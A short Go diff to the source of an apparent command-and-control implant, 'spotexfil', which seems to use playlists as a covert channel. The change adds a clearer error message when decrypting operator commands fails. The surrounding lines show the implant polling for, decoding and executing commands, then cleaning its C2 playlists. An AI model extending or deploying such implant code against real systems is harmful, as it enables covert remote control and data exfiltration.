@@ -4,6 +4,7 @@ import (
 	"context"
 	"fmt"
 	"math/rand"
+	"strings"
 	"time"
 
 	"github.com/sourcefrenchy/spotexfil/internal/protocol"
@@ -68,7 +69,12 @@ func (imp *Implant) pollAndExecute() {
 		payload := protocol.ReassemblePayload(chunkMetas)
 		cmdDict, err := protocol.DecodeMessage(payload, imp.key)
 		if err != nil {
-			fmt.Printf("[!] Failed to decode seq=%d: %v\n", seqNum, err)
+			errStr := strings.ToLower(err.Error())
+			if strings.Contains(errStr, "tag") || strings.Contains(errStr, "decrypt") || strings.Contains(errStr, "cipher") {
+				fmt.Printf("[!] Decryption failed for seq=%d: encryption key mismatch with operator?\n", seqNum)
+			} else {
+				fmt.Printf("[!] Failed to decode seq=%d: %v\n", seqNum, err)
+			}
 			_ = imp.client.CleanC2Playlists(ctx,
 				protocol.ChannelCmd, imp.key, seqNum)
 			continue
